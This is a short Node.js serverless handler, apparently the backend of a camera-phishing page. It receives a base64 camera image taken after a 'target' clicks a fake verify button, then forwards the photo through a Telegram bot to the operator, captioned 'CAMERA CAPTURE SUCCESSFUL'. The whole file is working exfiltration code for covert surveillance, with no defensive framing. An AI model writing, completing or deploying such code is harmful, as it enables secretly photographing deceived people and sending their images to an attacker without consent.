const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
    if (req.method === 'POST') {
        const { image } = req.body; // This is the Base64 image string
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
        
        // Convert Base64 string to a Buffer for Telegram
        const buffer = Buffer.from(base64Data, 'base64');

        await bot.telegram.sendPhoto(process.env.OWNER_ID, { source: buffer }, {
            caption: `📸 <b>CAMERA CAPTURE SUCCESSFUL</b>\n\nTarget clicked the verify button.`,
            parse_mode: 'HTML'
        });

        return res.status(200).json({ status: 'ok' });
    }
    res.status(405).send('Method Not Allowed');
};
